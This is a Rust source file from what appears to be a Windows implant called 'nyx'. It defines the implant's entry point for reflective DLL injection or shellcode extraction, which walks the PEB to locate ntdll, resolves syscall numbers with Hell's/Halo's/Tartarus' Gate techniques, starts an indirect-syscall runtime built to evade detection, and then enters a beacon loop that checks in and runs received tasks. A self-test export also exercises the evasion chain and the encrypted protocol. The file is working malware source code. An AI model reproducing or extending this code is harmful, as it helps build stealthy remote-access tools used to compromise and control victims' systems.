//! PIC entry point + task loop bootstrap.
//!
//! For a `cdylib`/shellcode implant the "entry" is an exported function the
//! loader calls (reflective DLL injection) or a thread the host spins up. It:
//!   1. locates ntdll + resolves the API set it needs (no allocation yet),
//!   2. the global allocator self-bootstraps on first `alloc`,
//!   3. runs the beacon loop: check-in → receive tasks → execute → repeat.
//!
//! All Windows-only. On the dev host this module is excluded by cfg.
//!
//! The real PIC extraction (Stardust-style sRDI) turns the cdylib into raw
//! position-independent shellcode whose first byte is the entry below. Until
//! that extraction step exists, the function is the reflective entry a
//! host-side loader calls after mapping the DLL.

#![cfg(target_os = "windows")]

use crate::resolve::LiveNtdll;

/// The reflective/PIC entry. Resolves ntdll, builds the SSN table, primes the
/// indirect-syscall runtime, then enters the beacon loop.
///
/// Marked `#[no_mangle]` so it survives `opt-level="z"` and is the address sRDI
/// extraction marks as the entry point.
#[no_mangle]
pub unsafe extern "system" fn nyx_entry() {
    // 1. PEB-walk ntdll + resolve the SSN table (validates resolve.rs).
    let Some(ntdll) = LiveNtdll::locate() else {
        core::hint::spin_loop();
        return;
    };
    let _ssn_table = ntdll.resolve_table_owned();

    // 2. Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs.
    //    This is what turns nyx_evasion from an algorithm into a live runtime.
    let _syscall_rt = crate::syscalls::Runtime::init();

    // 3. Enter the beacon loop (WinHTTP check-in + task loop).
    crate::beacon::beacon_loop();
}

/// **Self-test entry** (benign validation). Resolves ntdll, builds the SSN
/// table, and exits the process with a code reporting the result:
///   - exit code = number of SSNs resolved (>0 = PEB walk + resolve worked)
///   - exit code = 0xFFFFFFFF = ntdll could not be located
///
/// Invoke via: `rundll32 nyx_implant_win.dll,nyx_selftest` then check
/// `%ERRORLEVEL%`. This validates the evasion-runtime chain (PEB walk → export
/// table → SSN resolution) on a real Windows host without any network activity
/// or persistence — a benign closed-loop check.
/// Exit with `code` via the resolved ExitProcess; traps if unavailable.
unsafe fn report_exit(exit_proc: Option<usize>, code: u32) -> ! {
    if let Some(e) = exit_proc {
        let f: extern "system" fn(u32) -> ! = core::mem::transmute(e);
        f(code);
    }
    loop { core::hint::spin_loop(); }
}

#[no_mangle]
pub unsafe extern "system" fn nyx_selftest() {
    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");

    // === Phase 1: PEB walk + export table (no alloc) ===
    // Exit 0x600 + N (N = ntdll named export count, ~2365 on Win2019).
    let base = match LiveNtdll::locate_base() {
        Some(b) => b,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    let e_lfanew = *(base.add(0x3C) as *const i32) as usize;
    let opt = base.add(e_lfanew + 24);
    let magic = *(opt as *const u16);
    let dd_off = if magic == 0x20B { 112 } else { 96 };
    let export_rva = *(opt.add(dd_off) as *const u32);
    let _n_names: u32 = if export_rva != 0 {
        let dir = base.add(export_rva as usize) as *const crate::resolve::ExportDirectory;
        (*dir).number_of_names
    } else { 0 };

    // === Phase 2: SSN resolution (allocates) ===
    // Exit 0x100 + N (N = resolved SSN count). Proves allocator + Hell/Halo/Tartarus.
    crate::ntalloc::force_resolve();
    let ntdll = match LiveNtdll::locate() {
        Some(n) => n,
        None => report_exit(exit_proc, 0xFFFFFFFF),
    };
    let table = ntdll.resolve_table_owned();
    let _ssn_count = table.iter().filter(|(_, ssn)| *ssn != u32::MAX).count();

    // === Phase 3: protocol crypto round-trip (no network) ===
    // Exit 0xE01 = success; 0xE00 = failure.
    let ikp = nyx_protocol::ImplantKeypair::generate();
    let dummy_server_pub = [0x42u8; 32];
    let key = ikp.session_key(&dummy_server_pub);
    let pubkey = ikp.public_bytes();
    let plaintext = b"check-in-test-payload";
    let frame = nyx_protocol::encode_frame(&pubkey, 1, &key, plaintext);
    let raw = match nyx_protocol::parse_frame(&frame) {
        Ok(r) => r,
        Err(_) => report_exit(exit_proc, 0xE00),
    };
    let decoded = match nyx_protocol::open_frame(&key, &raw) {
        Ok(p) => p,
        Err(_) => report_exit(exit_proc, 0xE00),
    };
    if decoded.as_slice() != plaintext.as_slice() {
        report_exit(exit_proc, 0xE00);
    }
    // 0xE01: crypto round-trip OK. If an echo server is listening on 8443,
    // continue to the transport test; otherwise report success and exit.
    let payload: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04];
    match crate::transport::post_frame(b"127.0.0.1", 8443, b"/beacon", &payload) {
        Some(resp) => {
            if resp.len() == payload.len() && resp.as_slice() == payload.as_slice() {
                report_exit(exit_proc, 0xF07); // transport + crypto both OK
            } else {
                report_exit(exit_proc, 0xF08); // transport OK but mismatch
            }
        }
        None => report_exit(exit_proc, 0xE01), // no echo server; crypto alone OK
    }
}
